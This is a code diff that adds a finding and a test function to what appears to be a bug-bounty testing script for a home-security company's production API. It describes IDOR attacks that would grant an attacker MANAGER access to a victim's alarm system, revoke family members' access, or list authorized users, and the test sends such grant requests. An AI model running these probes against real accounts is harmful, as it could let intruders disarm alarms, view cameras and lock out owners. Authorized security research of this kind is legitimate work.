@@ -398,6 +398,31 @@ FINDINGS = [
                   'Camera UUID: likely a device UUID from pairing; readable via GET IDOR on subscription cameras. '
                   'Test: GET /v1/subscriptions/{victim_sid}/cameras with own token; 200+uuid = enumeration CRITICAL. '
                   'PATCH /v1/cameras/{victim_uuid}/settings {"privacyEnable":true}; 200 = settings write CRITICAL.'),
+    Finding("F39", "CRITICAL", "Location Grant Authorization IDOR — Grant Attacker Admin Access to Victim System",
+            "location_auth", "/locations/{locationId}", "POST+GET+POST(revoke)", None,
+            verified=False,
+            notes='APK: LocationAuthorizationsService.java, CreateGrantAuthorizationBody.java, '
+                  'AuthorizationRole.java (classes14.dex). '
+                  'Service base: https://location-grant-authorizations.prd.services.simplisafe.com/v1. '
+                  'Endpoints: '
+                  'GET /locations/{locationId} -> GrantAuthorizationsResponse (who has access). '
+                  'POST /locations/{locationId} body: {granteeName, granteeEmail, role, expiry} -> GrantAuthorization. '
+                  'POST /locations/{locationId}/revoke body: {granteeEmail, role} -> revoke access. '
+                  'GET /grantees/{granteeId} -> GranteeAuthorizationResponse. '
+                  'AuthorizationRole enum: MANAGER (highest), STAFF, UNKNOWN. '
+                  'NOTE: This is the 30% HackerOne bonus feature "Additional User Access". '
+                  'IDOR attack A — self-grant: '
+                  'POST /locations/{victim_locationId} {"granteeName":"Attacker","granteeEmail":"attacker@example.com","role":"MANAGER"} '
+                  'with own token -> if locationId not JWT-bound: grants attacker MANAGER access to victim security system. '
+                  'Attacker can now arm/disarm, view cameras, read data, modify settings — as authorized user. '
+                  'IDOR attack B — lock-out: '
+                  'POST /locations/{victim_locationId}/revoke {"granteeEmail":"family@victim.com","role":"MANAGER"} '
+                  '-> revokes authorized family member access; they can no longer operate the system. '
+                  'IDOR attack C — read: '
+                  'GET /locations/{victim_locationId} -> see all users who have access to victim system '
+                  '(names, emails, roles of all authorized users). '
+                  'Test: POST /locations/{victim_locationId} {"granteeName":"Test","granteeEmail":"probe@test.invalid","role":"MANAGER"}; '
+                  '200/201 = CRITICAL. Check if invitation email sent (if so, do NOT use real victim addresses in test).'),
 ]
 
 
@@ -1183,6 +1208,28 @@ def test_wifi_credentials_idor(token, victim_serial, victim_sid):
             _print("CRIT", 200, f"200 (parse err: {e}) raw={r.text[:200]}")
     else:
         _print("INFO", r.status_code, f"wifiCredentials: {r.text[:100]}")
+
+
+def test_location_grant_idor(token, victim_location_id, probe_email="idor-probe@example.invalid"):
+    """F39: Read grant authorizations for victim location + attempt self-grant as MANAGER."""
+    print(f"\n=== F39 — Location Grant Authorization IDOR (locationId={victim_location_id}) ===")
+    # Step 1: read who has access
+    r = get(f"{SERVICES['location_auth']}/locations/{victim_location_id}", token=token)
+    if r and r.status_code == 200:
+        _print("CRIT", 200, f"GRANT LIST locationId={victim_location_id}: {r.text[:300]}")
+    else:
+        _print("INFO", r.status_code if r else 0,
+               f"grant list: {r.text[:80] if r else 'no response'}")
+    # Step 2: attempt self-grant (uses probe@example.invalid — does NOT send real email)
+    body = {"granteeName": "IDOR-Probe", "granteeEmail": probe_email, "role": "MANAGER"}
+    r2 = post(f"{SERVICES['location_auth']}/locations/{victim_location_id}", token=token, json=body)
+    if not r2:
+        print("  POST failed"); return
+    if r2.status_code in (200, 201):
+        _print("CRIT", r2.status_code,
+               f"GRANT CREATED locationId={victim_location_id} -> {probe_email} MANAGER: {r2.text[:200]}")
+    else:
+        _print("INFO", r2.status_code, f"grant create: {r2.text[:100]}")
 
 
 def test_camera_settings_idor(token, victim_sid, victim_camera_uuid=None):
